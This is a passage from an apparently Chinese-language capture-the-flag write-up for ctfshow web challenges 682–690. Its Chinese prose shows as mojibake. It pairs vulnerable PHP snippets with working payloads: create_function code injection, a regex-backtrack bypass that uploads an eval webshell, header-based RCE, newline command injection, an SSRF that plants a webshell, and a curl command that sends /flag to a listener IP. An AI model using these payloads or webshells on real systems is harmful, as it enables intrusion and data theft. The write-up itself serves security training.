punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> srcString<span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        currByte <span class="token operator">=</span> <span class="token punctuation">(</span>srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token operator">:</span> <span class="token punctuation">(</span>srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> srcString<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                nextByte <span class="token operator">=</span> <span class="token punctuation">(</span>srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span>                    <span class="token operator">?</span> srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>                    <span class="token operator">:</span> <span class="token punctuation">(</span>srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                nextByte <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            digit <span class="token operator">=</span> currByte <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">0xFF</span> <span class="token operator">>></span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>            index <span class="token operator">=</span> <span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">;</span>            digit <span class="token operator">&lt;&lt;=</span> index<span class="token punctuation">;</span>            digit <span class="token operator">|=</span> <span class="token punctuation">(</span>nextByte <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            i<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            digit <span class="token operator">=</span> <span class="token punctuation">(</span>currByte <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> <span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1F</span><span class="token punctuation">;</span>            index <span class="token operator">=</span> <span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                i<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        retrunString <span class="token operator">=</span> retrunString <span class="token operator">+</span> <span class="token constant">BASE32CHAR</span><span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>digit<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>retrunString<span class="token punctuation">.</span>length <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        retrunString <span class="token operator">+=</span> <span class="token string">"="</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> retrunString<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ†æä»£ç ï¼Œè¦æ±‚flagç¬¦åˆä¸‹åˆ—æ¡ä»¶</p><ol><li>å‰å…«ä½ä¸ºå­—ç¬¦ä¸²<code>ctfshow&#123;</code>ï¼Œç»“å°¾ä¸º<code>&#125;</code></li><li>flagç»è¿‡sha256è¿ç®—çš„ç»“æœä¸º<code>e3a331710b01ff3b3e34d5f61c2c9e1393ccba3e31f814e7debd537c97ed7d3d</code></li><li>ä¸­é—´å†…å®¹é•¿åº¦ä¸º36ï¼Œæœ‰4ä¸ªUUIDåˆ†å—<code>-</code></li><li>c2nå‡½æ•°çš„ä½œç”¨ï¼šå°†UUIDä¸­çš„å†…å®¹è½¬æ¢ä¸º10è¿›åˆ¶æ•°</li><li>s2n2suå‡½æ•°çš„ä½œç”¨ï¼šå°†UUIDä¸­æ¯ä¸€ä½çš„æ•°å­—ç›¸åŠ å¹¶è¿”å›æœ€ç»ˆçš„å€¼</li><li>ç¬¬ä¸€ä¸ªUUIDåˆ†æ®µçš„UUIDå’Œå€¼ä¸º63</li><li>ç¬¬ä¸€ä¸ªUUIDåˆ†æ®µçš„å‰å››ä½ç»è¿‡sha256è¿ç®—åçš„ç»“æœæ˜¯<code>c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400</code>ï¼Œç»“æœä¸º<code>592b</code></li><li>ç¬¬ä¸€ä¸ªUUIDåˆ†æ®µå4ä½ç»è¿‡sha256è¿ç®—åçš„ç»“æœæ˜¯<code>f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc</code>ï¼Œç»“æœä¸º<code>9d77</code></li><li>ç¬¬äºŒä¸ªUUIDåˆ†æ®µæ˜¯<code>9dda</code></li><li>ç¬¬ä¸‰ä¸ªUUIDçš„ç¬¬äºŒä½æ˜¯eï¼Œå¹¶ä¸”å‰©ä½™ä¸‰ä½çš„è¿æ¥åä¸º430</li><li>ç¬¬å››ä¸ªUUIDä¸º<code>94a4</code></li><li>ç¬¬äº”ä¸ªUUIDç»è¿‡base32ç¼–ç ç»“æœä¸º<code>GVSTMNDGGQ2DSOLBGUZA====</code></li></ol><p>æœ€ç»ˆæ„é€ å‡ºflag</p><pre class="line-numbers language-none"><code class="language-none">ctfshow&#123;592b9d77-9dda-4e30-94a4-5e64f4499a52&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¡ºä¾¿è´´ä¸ªçˆ†ç ´è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> <span class="token operator">*</span>string<span class="token operator">=</span><span class="token string">"0123456789abcdef"</span>k<span class="token operator">=</span>product<span class="token punctuation">(</span>string<span class="token punctuation">,</span>repeat<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> k<span class="token punctuation">:</span>    aaa<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    out1 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>aaa<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>out1<span class="token operator">==</span><span class="token string">'c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>aaa<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>out1<span class="token operator">==</span><span class="token string">'f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>aaa<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>683</strong></p><p>æ˜æ˜¾çš„å¼±ç±»å‹æ¯”è¾ƒ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ç§€'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ç§€'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'å¿…é¡»æ˜¯æ•°å­—'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ç§€'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">30</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ä½ å¤ªçŸ­äº†'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ç§€'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">30</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ä½ å¤ªé•¿äº†'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ç§€'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‡ªåŠ¨è½¬æ¢æ—¶xexä¼šè¢«è½¬æ¢ä¸ºåŸå§‹æ•°å­—ï¼Œintå¼ºåˆ¶è½¬æ¢stringæ—¶å–åˆ°å­—æ¯åœæ­¢</p><pre class="line-numbers language-none"><code class="language-none">payload:?ç§€&#x3D;0.6e7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>684</strong></p><p>æºç åœ¨æ­¤</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arg'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$action</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å˜é‡$actionè¦å‡ºç°æ•°å­—å­—æ¯ä»¥å¤–çš„å­—ç¬¦ï¼Œè¿˜è¦æ‰§è¡Œå‡½æ•°ï¼Œä½¿ç”¨\create_functionï¼Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯phpç¯å¢ƒä¸­é»˜è®¤çš„namespace</p><blockquote><p>phpé‡Œé»˜è®¤å‘½åç©ºé—´æ˜¯\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\function_name() è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚ å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚ æ¥ä¸‹æ¥ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥å¼•å‘å±é™©çš„å‡½æ•°ã€‚</p></blockquote><blockquote><p>create_function()æ˜¯PHPä¸­çš„å†…ç½®å‡½æ•°ï¼Œç”¨äºåœ¨PHPä¸­åˆ›å»ºåŒ¿å(lambda-style)å‡½æ•°ã€‚</p><p><strong>ç”¨æ³•:</strong></p><pre class="line-numbers language-none"><code class="language-none">string create_function ( $args, $code )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>å‚æ•°ï¼š</strong>è¯¥å‡½æ•°æ¥å—ä»¥ä¸‹ä¸¤ä¸ªå‚æ•°ï¼š</p><ul><li>**$args:**å®ƒæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„å‡½æ•°å‚æ•°ã€‚</li><li>**$code:**å®ƒæ˜¯å­—ç¬¦ä¸²ç±»å‹çš„å‡½æ•°ä»£ç ã€‚</li></ul><p><strong>æ³¨æ„ï¼š</strong>é€šå¸¸ï¼Œè¿™äº›å‚æ•°å°†ä½œä¸ºå•å¼•å·åˆ†éš”çš„å­—ç¬¦ä¸²ä¼ é€’ã€‚ä½¿ç”¨å•å¼•å·å¼•èµ·æ¥çš„å­—ç¬¦ä¸²çš„åŸå› æ˜¯ä¸ºäº†é˜²æ­¢å˜é‡åè¢«è§£æï¼Œå¦åˆ™ï¼Œå°†éœ€è¦åŒå¼•å·æ¥è½¬ä¹‰å˜é‡åï¼Œä¾‹å¦‚\ $avarã€‚</p><p><strong>è¿”å›å€¼ï¼š</strong>æ­¤å‡½æ•°ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›å”¯ä¸€çš„å‡½æ•°åç§°ï¼Œå¦åˆ™ï¼Œåœ¨é”™è¯¯æ—¶è¿”å›FALSEã€‚</p></blockquote><p>è€Œå¯¹äºcreate_functionå‡½æ•°æ¥è¯´ï¼Œå®é™…æ‰§è¡Œçš„å†…å®¹å¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">function noname($args) &#123; $code &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç»“å°¾æˆ‘ä»¬ä½¿ç”¨}é—­åˆï¼Œæœ€ç»ˆçš„payloadå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">payload:?action&#x3D;%5ccreate_function&amp;arg&#x3D;&#125;system(&#39;tac &#x2F;secret_you_never_know&#39;);&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>685</strong></p><p>åˆ©ç”¨æ­£åˆ™æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡</p><blockquote><p>PHP ä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™ pcre è®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ pcre.backtrack_limit<br>å›æº¯æ¬¡æ•°ä¸Šé™é»˜è®¤æ˜¯ 100 ä¸‡ã€‚å¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡äº† 100 ä¸‡ï¼Œpreg_match å°†ä¸å†è¿”å›é 1 å’Œ 0ï¼Œè€Œæ˜¯ falseã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼äº†ã€‚</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://b826efef-6cde-4fa8-84d3-4cb699605ab2.challenge.ctf.show"</span>files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token string">'&lt;?php eval($_POST[1]);?>'</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">1000000</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>686</strong></p><p>æ— å‚RCE</p><pre class="line-numbers language-none"><code class="language-none">payload:?code&#x3D;system(current(getallheaders()));X-Forwarded-Host: cat &#x2F;secret_you_never_know<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>687</strong></p><p>æ¢è¡Œæ‰§è¡Œå‘½ä»¤</p><pre class="line-numbers language-none"><code class="language-none">payload:?ip&#x3D;1%0atac &#x2F;flaaag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>688</strong></p><p>ä¿©å‡½æ•°ä¸€èµ·ç”¨æœ‰çš„é—®é¢˜</p><p><code>escapeshellarg(); escapeshellcmd();</code></p><pre class="line-numbers language-none"><code class="language-none">payload:?url&#x3D;http:&#x2F;&#x2F;ç›‘å¬ä½¿ç”¨çš„ip:port&#x2F;&#39; -F file&#x3D;@&#x2F;flag&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®é™…ä¼ å…¥shellçš„æ˜¯</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> <span class="token string">'http://IP:ç«¯å£/'</span><span class="token punctuation">\</span><span class="token punctuation">\</span>'<span class="token string">' -F file=@/flag'</span><span class="token punctuation">\</span><span class="token punctuation">\</span>'<span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç›´æ¥å¸¦å‡ºæ–‡ä»¶</p><p><strong>689</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This is a waf!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'http://127.0.0.1/'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"console.log(<span class="token interpolation"><span class="token variable">$path</span></span> update successed!)"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello.CTFshow"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œåœ¨pathä½ç½®æ²¡æœ‰è¿‡æ»¤ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸ç®¡æˆ‘ä»¬åœ¨pathä½ç½®å†™å…¥ä»€ä¹ˆéƒ½ä¼šåŸå°ä¸åŠ¨çš„è¿”å›ï¼Œæ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬è®©dockerè®¿é—®è‡ªå·±ï¼Œåœ¨pathå¤„ä¼ å…¥æœ¨é©¬å³å¯</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;f784bf7a-ace9-414a-bbfd-cfd348cefd95.challenge.ctf.show&#x2F;?file&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;?file&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;%26path&#x3D;%3C?php%20eval($_POST[1]);?%3E&amp;path&#x3D;b.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>690</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$args</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\w+$/'</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sorry"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./ '</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼ 